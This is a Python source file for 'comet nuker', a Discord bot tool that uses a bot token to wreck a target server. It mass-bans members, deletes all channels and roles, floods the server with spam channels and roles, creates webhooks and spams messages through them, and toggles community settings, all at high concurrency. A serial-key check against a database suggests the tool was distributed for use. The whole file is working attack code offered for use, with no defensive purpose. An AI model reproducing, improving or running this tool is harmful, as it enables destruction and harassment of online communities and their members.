import os, json, logging, random, time, asyncio

os.system("title comet nuker v2.5.3")

try:
    import discord
    from discord.ext import commands
except (ModuleNotFoundError, ImportError):
    os.system("pip install discord")
    import discord
    from discord.ext import commands

try:
    import pymongo
except (ModuleNotFoundError):
    os.system("pip install pymongo")
    os.system("pip install pymongo[srv]")
    import pymongo

try:
    import aiohttp
except (ModuleNotFoundError):
    os.system("pip install aiohttp")
    import aiohttp

try:
    from tasksio import TaskPool
except (ModuleNotFoundError):
    os.system("pip install tasksio")
    from tasksio import TaskPool

logging.basicConfig(
    level=logging.INFO,
    format=
    "\033[38;5;12m[\033[38;5;999m%(asctime)s.%(msecs)03d\033[38;5;12m] \033[38;5;999m-> %(message)s",
    datefmt="%H:%M:%S")

comet = commands.Bot(
    command_prefix="comet!!omgomgomg!!!ilovecometsomuch!!!wowowowowoowwo",
    case_insensitive=False,
    bot=True,
    help_command=None,
    intents=discord.Intents.all())

clear = lambda: os.system("cls;clear")
user_c = None
clear()

with open("settings.json") as file:
    try:
        config = json.load(file)

        botToken = config["Nuker Settings"]["Bot Token"]
        guildID = config["Nuker Settings"]["Guild to Wizz"]
        channelNames = config["Nuker Settings"]["Channel Names"]
        roleNames = config["Nuker Settings"]["Role Names"]

        webhookNames = config["Webhook Settings"]["Webhook Names"]
        spamMessages = config["Webhook Settings"]["Spam Messages"]
        spamAmount = config["Webhook Settings"]["Spam Amount"]

        whitelistedUsers = config["Safety Settings"]["Whitelisted Users"]
    except (Exception) as error:
        logging.error(error)


class CometNuker(object):
    def __init__(self):
        self.Headers = {"Authorization": "Bot {}".format(botToken)}
        self.Tasks = 500
        self.API = random.randint(8, 9)
        self.Webhooks = []
        self.sent = 0

    async def BanMembers(self, TargetOBJ: discord.Member):
        try:
            async with aiohttp.ClientSession(
                    headers=self.Headers) as self.HTTPClient:
                async with self.HTTPClient.put(
                        "https://discord.com/api/v{}/guilds/{}/bans/{}".format(
                            self.API, TargetOBJ.id, guildID)) as response:
                    if (response.status in range(200, 299)):
                        logging.info(
                            "Banned user {} | \033[38;5;12m(\033[0m{}\033[38;5;12m)."
                            .format(TargetOBJ, TargetOBJ.id))
                    elif response.status == 429:
                        json = await response.json()
                        logging.info(
                            "Ratelimited for {}s\033[38;5;12m.".format(
                                json["retry_after"]))
                        return await self.BanMembers(TargetOBJ)
                    else:
                        json = await response.json()
                        logging.info(json["message"])
        except Exception:
            pass

    async def BanIDs(self, UserID: str):
        try:
            async with aiohttp.ClientSession(headers=self.Headers) as self.HTTPClient:
                async with self.HTTPClient.put("https://discord.com/api/v{}/guilds/{}/bans/{}".format(self.API, guildID, UserID)) as response:
                    if (response.status in range(200, 299)):
                        logging.info("Banned user \033[38;5;12m(\033[0m{}\033[38;5;12m).".format(UserID))
                    elif response.status == 429:
                        json = await response.json()
                        logging.info("Ratelimited for {}s\033[38;5;12m.".format(json["retry_after"]))
                        return await self.BanIDs(UserID)
                    else:
                        json = await response.json()
                        logging.info(json["message"])
        except Exception as error:
            logging.error(error)

    async def CreateChannels(self, ChannelName: str, ChannelType: str):
        try:
            if ChannelType == "text": json = {"name": ChannelName, "type": 0}
            if ChannelType == "voice":
                json = {"name": ChannelName, "type": 2, "user_limit": 1}
            async with aiohttp.ClientSession(
                    headers=self.Headers) as self.HTTPClient:
                async with self.HTTPClient.post(
                        "https://discord.com/api/v{}/guilds/{}/channels".
                        format(self.API, guildID),
                        json=json) as response:
                    if (response.status in range(200, 299)):
                        logging.info(
                            "Created channel \033[38;5;12m(\033[0m{}\033[38;5;12m)."
                            .format(ChannelName.replace(" ", "-")))
                    elif response.status == 429:
                        json = await response.json()
                        logging.info(
                            "Ratelimited for {}s\033[38;5;12m.".format(
                                json["retry_after"]))
                        return await self.CreateChannels(
                            ChannelName, ChannelType)
                    else:
                        json = await response.json()
                        logging.info(json["message"])
        except Exception:
            pass

    async def DeleteChannels(self, channel: str):
        try:
            async with aiohttp.ClientSession(
                    headers=self.Headers) as self.HTTPClient:
                async with self.HTTPClient.delete(
                        "https://discord.com/api/v{}/channels/{}".format(
                            self.API, channel.id)) as response:
                    if (response.status in range(200, 299)):
                        logging.info(
                            "Deleted channel {} | \033[38;5;12m(\033[0m{}\033[38;5;12m)."
                            .format(channel, channel.id))
                    elif response.status == 429:
                        json = await response.json()
                        logging.info(
                            "Ratelimited for {}s\033[38;5;12m.".format(
                                json["retry_after"]))
                        return await self.DeleteChannels(channel)
                    else:
                        json = await response.json()
                        logging.info(
                            "Ratelimited for {}s\033[38;5;12m.".format(
                                json["retry_after"]))
        except Exception:
            pass

    async def CreateRoles(self, RoleName: str):
        try:
            json = {"name": RoleName}
            async with aiohttp.ClientSession(
                    headers=self.Headers) as self.HTTPClient:
                async with self.HTTPClient.post(
                        "https://discord.com/api/v{}/guilds/{}/roles".format(
                            self.API, guildID),
                        json=json) as response:
                    if (response.status in range(200, 299)):
                        logging.info(
                            "Created role \033[38;5;12m(\033[0m{}\033[38;5;12m)."
                            .format(RoleName))
                    elif response.status == 429:
                        json = await response.json()
                        logging.info(
                            "Ratelimited for {}s\033[38;5;12m.".format(
                                json["retry_after"]))
                        return await self.CreateRoles(RoleName)
                    else:
                        json = await response.json()
                        logging.info(json["message"])
        except Exception:
            pass

    async def DeleteRoles(self, role: str):
        try:
            async with aiohttp.ClientSession(
                    headers=self.Headers) as self.HTTPClient:
                async with self.HTTPClient.delete(
                        "https://discord.com/api/v{}/guilds/{}/roles/{}".
                        format(self.API, guildID, role.id)) as response:
                    if (response.status in range(200, 299)):
                        logging.info(
                            "Deleted role {} | \033[38;5;12m(\033[0m{}\033[38;5;12m)."
                            .format(role, role.id))
                    elif response.status == 429:
                        json = await response.json()
                        logging.info(
                            "Ratelimited for {}s\033[38;5;12m.".format(
                                json["retry_after"]))
                        return await self.DeleteRoles(role)
                    else:
                        json = await response.json()
                        logging.info(json["message"])
        except Exception:
            pass

    async def CommunitySpam(self):
        try:
            json = random.choice([
                {
                    "description": None,
                    "features": ["NEWS"],
                    "preferred_locale": "en-US",
                    "rules_channel_id": None,
                    "public_updates_channel_id": None
                }, {
                    "features": ["COMMUNITY"],
                    "preferred_locale": "en-US",
                    "rules_channel_id": "1",
                    "public_updates_channel_id": "1"
                }])
            async with aiohttp.ClientSession(
                    headers=self.Headers) as self.HTTPClient:
                async with self.HTTPClient.patch(
                        "https://discord.com/api/v{}/guilds/{}".format(
                            self.API, guildID), json=json) as response:
                    if (response.status in range(200, 299)):
                        logging.info("Spammed community channel.")
                    elif response.status == 429:
                        json = await response.json()
                        logging.info(
                            "Ratelimited for {}s\033[38;5;12m.".format(
                                json["retry_after"]))
                        return await self.CommunitySpam()
                    else:
                        json = await response.json()
                        logging.info(json["message"])
        except Exception as error:
            logging.error(error)

    async def MakeWebhook(self, channel: discord.TextChannel):
        try:
            json = {"name": random.choice(webhookNames)}
            async with aiohttp.ClientSession(
                    headers=self.Headers) as self.HTTPClient:
                async with self.HTTPClient.post(
                        "https://discord.com/api/v{}/channels/{}/webhooks".
                        format(self.API, channel.id),
                        json=json) as response:
                    if (response.status in range(200, 299)):
                        json = await response.json()
                        logging.info(
                            "Created webhook on {} | Webhook ID: \033[38;5;12m(\033[0m{}\033[38;5;12m)."
                            .format(channel, json["id"]))
                        self.Webhooks.append(
                            "https://discord.com/api/webhooks/{}/{}".format(
                                json["id"], json["token"]))
                    else:
                        json = await response.json()
                        logging.info(
                            "Ratelimited for {}s\033[38;5;12m.".format(
                                json["retry_after"]))
        except Exception:
            pass

    async def SendWebhook(self, WebhookURL: str):
        try:
            while self.sent <= spamAmount:
                json = {"content": random.choice(spamMessages)}
                async with aiohttp.ClientSession(
                        headers={"Content-Type": "application/json"
                                 }) as self.HTTPClient:
                    async with self.HTTPClient.post(WebhookURL,
                                                    json=json) as response:
                        if (response.status in range(200, 299)):
                            self.sent += 1
                        elif response.status == 429:
                            return await self.SendWebhook(WebhookURL)
        except Exception:
            pass

    async def Menu(self):
        clear()
        print(logo)
        guild = comet.get_guild(guildID)
        logging.info("Connecting with guild...")
        if guild == None or guild == " ":
            logging.info(
                "Guild isn't found on discord's database.".format(guildID))
            input()
            os._exit(0)
        await asyncio.sleep(1.5)
        logging.info(
            "Loaded with client \033[38;5;12m{}\033[0m & connected with guild \033[38;5;12m{}\033[0m."
            .format(comet.user, guild))
        logging.info(
            'Loaded nuke function; \033[38;5;12m"\033[0mmass-ban\033[38;5;12m"'
        )
        logging.info(
            'Loaded nuke function; \033[38;5;12m"\033[0mchannel-spam\033[38;5;12m"'
        )
        logging.info(
            'Loaded nuke function; \033[38;5;12m"\033[0mchannel-delete\033[38;5;12m"'
        )
        logging.info(
            'Loaded nuke function; \033[38;5;12m"\033[0mrole-spam\033[38;5;12m"'
        )
        logging.info(
            'Loaded nuke function; \033[38;5;12m"\033[0mrole-delete\033[38;5;12m"'
        )
        logging.info(
            'Loaded nuke function; \033[38;5;12m"\033[0mmass-webhook\033[38;5;12m"'
        )
        logging.info(
            'Loaded nuke function; \033[38;5;12m"\033[0mcc-spam\033[38;5;12m"')
        logging.info(
            'Loaded misc command; \033[38;5;12m"\033[0mleave-server\033[38;5;12m"'
        )
        print()

        try:
            command = str(
                input("\033[38;5;12m> \033[0mCommand\033[38;5;12m: \033[0m"))
        except:
            return await self.Menu()

        if command.lower() == "mass-ban":
            clear()
            print(logo)
            choice = str(
                input(
                    "\033[38;5;12m> \033[0mBan IDs [Y/N]\033[38;5;12m: \033[0m"
                ))
            if choice.lower() in ["Y", "y"]:
                members = [
                    str(member) for member in open("data/ids.txt").read().splitlines()
                ]
                logging.info("Banning {}(s) test ids.".format(len(members)))
                async with TaskPool(self.Tasks) as executor:
                    for MemberID in members:
                        if str(MemberID) in whitelistedUsers:
                            pass
                        else:
                            await executor.put(self.BanIDs(MemberID))
                return await self.Menu()
            else:
                members = await guild.chunk()
                logging.info("Banning {}(s) members.".format(len(members)))
                async with TaskPool(self.Tasks) as executor:
                    for Member in members:
                        if str(Member.id) in whitelistedUsers:
                            pass
                        else:
                            await executor.put(self.BanMembers(Member))
                return await self.Menu()

        elif command.lower() == "channel-spam":
            clear()
            print(logo)
            choice = str(
                input(
                    "\033[38;5;12m> \033[0mType [text/voice]\033[38;5;12m: \033[0m"
                ))
            if (choice not in ["text", "voice"]): choice = "text"
            amount = int(
                input("\033[38;5;12m> \033[0mAmount\033[38;5;12m: \033[0m"))
            print()
            logging.info("Creating {} channel(s), type: {}.".format(
                amount, choice))
            async with TaskPool(self.Tasks) as executor:
                for i in range(amount):
                    await executor.put(
                        self.CreateChannels(random.choice(channelNames),
                                            choice))
            return await self.Menu()

        elif command.lower() == "channel-delete":
            clear()
            print(logo)
            logging.info("Deleting all of {} channel(s).".format(guild))
            async with TaskPool(self.Tasks) as executor:
                for Channel in guild.channels:
                    await executor.put(self.DeleteChannels(Channel))
            return await self.Menu()

        elif command.lower() == "mass-webhook":
            clear()
            print(logo)
            logging.info("Webhook flooding {}.".format(guild))
            async with TaskPool(10_000) as executor:
                for Channel in guild.channels:
                    if isinstance(Channel, discord.TextChannel):
                        await executor.put(self.MakeWebhook(Channel))
            async with TaskPool(10_000) as executor:
                logging.info("Spamming webhooks\033[38;5;12m...")
                for WebhookURL in self.Webhooks:
                    await executor.put(self.SendWebhook(WebhookURL))
            return await self.Menu()

        elif command.lower() == "role-spam":
            clear()
            print(logo)
            amount = int(
                input("\033[38;5;12m> \033[0mAmount\033[38;5;12m: \033[0m"))
            print()
            logging.info("Creating {} role(s)".format(amount))
            async with TaskPool(self.Tasks) as executor:
                for i in range(amount):
                    await executor.put(
                        self.CreateRoles(random.choice(roleNames)))
            return await self.Menu()

        elif command.lower() == "role-delete":
            clear()
            print(logo)
            logging.info("Deleting all of {} role(s)".format(guild))
            async with TaskPool(self.Tasks) as executor:
                for Role in guild.roles:
                    await executor.put(self.DeleteRoles(Role))
            return await self.Menu()

        elif command.lower() == "cc-spam":
            clear()
            print(logo)
            logging.info("Spamming community channel(s)".format(guild))
            async with TaskPool(self.Tasks) as executor:
                for _ in range(200):
                    await executor.put(self.CommunitySpam())
            return await self.Menu()

        elif command.lower() == "leave-server":
            clear()
            print(logo)
            logging.info("Leaving {}".format(guild))
            await guild.leave()
            return await self.Menu()

        else:
            return await self.Menu()


class Authentication(object):
    def __init__(self):
        self.MongoClient = pymongo.MongoClient(
            ""
        )
        self.db = self.MongoClient.get_database("comet").get_collection("auth")

    async def Start(self):

        logging.info("Authorizing client key\033[38;5;12m...")
        if not os.path.exists("Auth/authentication.json"):
            print(
                "\033[38;5;12m[\033[0mAuthorization\033[38;5;12m] \033[0m-> Enter Your User\033[38;5;12m; \033[0m",
                end="")
            user = str(input()).strip()

            print(
                "\033[38;5;12m[\033[0mAuthorization\033[38;5;12m] \033[0m-> Enter Your Serial Key\033[38;5;12m; \033[0m",
                end="")
            key = str(input()).strip()

            if (not self.db.find_one({"User": user, "Serial Key": key})):
                logging.info(
                    "Your authorization was not found in the database\033[38;5;12m."
                )
            data = {"User": user, "Serial Key": key}
            json.dump(data, open("Auth/authentication.json", "w+"), indent=4)
            with open("Auth/authentication.json") as file:
                try:
                    auth = json.load(file)
                    user = auth.get("User")
                    key = auth.get("Serial Key")
                    if (not self.db.find_one({
                            "User": user,
                            "Serial Key": key
                    })):
                        logging.info(
                            "Your authorization was not found in the database."
                        )
                    else:
                        logging.info(
                            "Welcome back {}, proceeding to menu\033[38;5;12m\033[38;5;12m."
                            .format(user))
                        user_c = auth.get("User")
                        time.sleep(2)
                        client = CometNuker()
                        await client.Menu()
                except (Exception):
                    clear()
                    logging.error("Comet nuker has unexpectedly stopped.")
        else:
            with open("Auth/authentication.json") as file:
                try:
                    auth = json.load(file)
                    user = auth.get("User")
                    key = auth.get("Serial Key")
                    if (not self.db.find_one({
                            "User": user,
                            "Serial Key": key
                    })):
                        logging.info(
                            "Your authorization was not found in the database."
                        )
                    else:
                        logging.info(
                            "Welcome back {}, proceeding to menu\033[38;5;12m."
                            .format(user))
                        user_c = auth.get("User")
                        client = CometNuker()
                        await client.Menu()
                except (Exception) as error:
                    clear()
                    logging.error(error)
                    logging.error("Comet nuker has unexpectedly stopped.")


@comet.event
async def on_connect():
    clear()
    await comet.change_presence(status=discord.Status.offline)
    client = CometNuker()
    await client.Menu()

logo = """
                                          
                              \033[0m┌┼┐    \033[38;5;12m╔═╗  ╔═╗  ╔╦╗  ╔═╗  ╔╦╗    \033[0m┌┼┐
                              \033[0m└┼┐    \033[38;5;12m║    ║ ║  ║║║  ║╣    ║     \033[0m└┼┐
                              \033[0m└┼┘    \033[38;5;12m╚═╝  ╚═╝  ╩ ╩  ╚═╝   ╩     \033[0m└┼┘
                        \033[38;5;12m═════════════════════════════════════════════════
                            \033[0m═════════════════════════════════════════
            
"""

if __name__ == "__main__":
    try:
        comet.run(botToken, bot=True, reconnect=True)
    except Exception as error:
        logging.error(error)
